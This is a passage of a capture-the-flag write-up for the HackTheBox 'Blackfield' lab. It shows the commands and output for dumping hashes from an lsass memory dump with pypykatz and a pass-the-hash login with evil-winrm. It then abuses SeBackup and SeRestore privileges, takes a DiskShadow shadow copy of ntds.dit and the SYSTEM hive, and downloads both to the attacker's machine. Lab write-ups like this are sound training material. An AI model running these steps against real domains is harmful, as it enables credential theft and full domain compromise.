class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>PS: a more clever approach would be to avoid dumping <code>tools/</code> which will take a
lot of time and space for generic binaries we do not need.</p><p>In <code>memory_analissy</code> there is a <code>lsass</code> dump.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cd memory_analysis</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ unzip lsass.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Archive:  lsass.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: lsass.DMP</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then we can use <strong>pypykatz</strong>, Python implementation of Mimikatz, to try to dump
hashes from here.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pypykatz lsa minidump lsass.DMP &gt; lsass_dump.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:root:Parsing file lsass.DMP</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So we obtained those two SHA1 hashes:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">svc_backup:463c13a9a31fc3252c68ba0a44f0221626a33e5c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Administrator:db5c89a961644f0978b4b69a4d2a2239d7886368</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And NT hashes:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">svc_backup:9658d1d1dcd9250115e2205d9f48400d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can use <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">evil-winrm</a> to make a pass the hash (PtH) authentication
and gain PowerShell acess:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Evil-WinRM shell v2.3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Establishing connection to remote endpoint</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; gc ../Desktop/user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0d1d70d4c5439a332577fcbc2bcbed15</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-svc_backup-to-root">Privilege Escalation of Machine : from svc_backup to root<a href="#privilege-escalation-of-machine--from-svc_backup-to-root" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from svc_backup to root" title="Direct link to Privilege Escalation of Machine : from svc_backup to root">​</a></h2><p>Let&#x27;s check what we can do with this account:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; net user svc_backup</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User name                    svc_backup</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Full Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Comment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User&#x27;s comment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Country/region code          000 (System Default)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Account active               Yes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Account expires              Never</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password last set            2/23/2020 10:54:48 AM</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password expires             Never</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password changeable          2/24/2020 10:54:48 AM</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password required            Yes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User may change password     Yes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Workstations allowed         All</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Logon script</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User profile</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Home directory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Last logon                   9/20/2020 9:38:19 PM</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Logon hours allowed          All</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Local Group Memberships      *Backup Operators     *Remote Management Use</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Global Group memberships     *Domain Users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The command completed successfully.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami /priv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PRIVILEGES INFORMATION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Privilege Name                Description                    State</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">============================= ============================== =======</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SeBackupPrivilege             Back up files and directories  Enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SeRestorePrivilege            Restore files and directories  Enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SeShutdownPrivilege           Shut down the system           Enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Our account have way to much power!</p><blockquote><p><em>SeBackup</em> &amp; <em>SeRestore</em> privileges (from the <em>Backup Operators</em> group) allow us to
set permissionand ownership on each file &amp; folder.</p></blockquote><p>References:</p><ul><li><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/" target="_blank" rel="noopener noreferrer">DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction, by bohops, March 26th 2018</a></li><li><a href="https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf" target="_blank" rel="noopener noreferrer">show me your privileges and I will lead you to SYSTEM, by Andrea Pierini at Hack in Paris, June 19th 2019</a></li></ul><p>Normally we shouldn&#x27;t be able to access ntds.dit (Active Directory database)
but since <em>SeBackup</em> &amp; <em>SeRestore</em> privileges let us set any permission on
any file we will be able to fix that.</p><p>Let&#x27;s auto-gives us full control on <code>ntds.dit</code>.</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ntds_file = &quot;C:\Windows\NTDS\ntds.dit&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$acl_ntds = Get-Acl $ntds_file</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$domain = &quot;blackfield.local&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$account = &quot;svc_backup&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule(&quot;$domain\$account&quot;,&quot;FullControl&quot;,&quot;Allow&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$acl_ntds.SetAccessRule($access_rule)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$acl_ntds | Set-Acl $ntds_file</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Get-acl $ntds_file | select -expand accesstostring</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">BLACKFIELD\svc_backup Allow  FullControl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NT AUTHORITY\SYSTEM Allow  FullControl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">BUILTIN\Administrators Allow  FullContro</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now we&#x27;ll use <code>DiskShadow</code> to make a shadow copy of the ntds.</p><blockquote><p>DiskShadow.exe is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). By default, DiskShadow uses an interactive command interpreter similar to that of DiskRaid or DiskPart. DiskShadow also includes a scriptable mode.</p><p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" target="_blank" rel="noopener noreferrer">Microsoft Docs</a></p></blockquote><p>Let&#x27;s prepapre the copy script (<code>diskshadow.txt</code>) to run <code>DiskShadow</code> in script
mode.</p><div class="language-batch codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-batch codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">set context persistent nowriters#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">add volume c: alias cyfun#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">create#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">expose %cyfun% x:#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exec &quot;cmd.exe&quot; /c copy x:\windows\ntds\ntds.dit c:\Users\svc_backup\Videos\ntds.dit#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">delete shadows volume %cyfun%#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">reset#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then we can use <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">evil-winrm</a> native upload feature.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; upload /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Uploading /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt to C:\Users\svc_backup\Videos\diskshadow.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Data: 268 bytes of 268 bytes copied</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Upload successful!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And then call <code>DiskShadow</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc_backup&gt; diskshadow.exe /s C:\Users\svc_backup\Videos\diskshadow.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Microsoft DiskShadow version 1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Copyright (C) 2013 Microsoft Corporation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">On computer:  DC01,  9/21/2020 12:12:50 AM</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-&gt; set context persistent nowriters</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-&gt; add volume c: alias cyfun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-&gt; create</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Alias cyfun for shadow ID {eef6f0be-3c60-4e69-985d-3bc400a24ff1} set as environment variable.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Alias VSS_SHADOW_SET for shadow set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef} set as environment variable.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Querying all shadow copies with the shadow copy set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        * Shadow copy ID = {eef6f0be-3c60-4e69-985d-3bc400a24ff1}               %cyfun%</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Shadow copy set: {12b5d80f-4368-4727-a02b-1b22f5e020ef}       %VSS_SHADOW_SET%</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Original count of shadow copies = 1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Creation time: 9/21/2020 12:12:51 AM</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Originating machine: DC01.BLACKFIELD.local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Service machine: DC01.BLACKFIELD.local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Not exposed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Number of shadow copies listed: 1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-&gt; expose %cyfun% z:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-&gt; %cyfun% = {eef6f0be-3c60-4e69-985d-3bc400a24ff1}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The shadow copy was successfully exposed as z:\.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-&gt; exec &quot;cmd.exe&quot; /c copy z:\windows\ntds\ntds.dit c:\Users\svc_backup\Videos\ntds.dit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The script file name is not valid.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">EXEC &lt;file.cmd&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Execute a script file on the local machine.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This command is used to duplicate or restore data as part of</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        a backup or restore sequence.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As I got issues with the <code>exec</code> command I manually copied the file afterward:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; cp x:\windows\ntds\ntds.dit .</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then we can also dump the SYSTEM hive:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; reg save hklm\system system.hive</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Again, we can use <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">evil-winrm</a> native download feature.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc_backup\Videos&gt; download ntds.dit /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Downloading C:\Users\svc_backup\Videos\ntds.dit to /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Download successful!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" 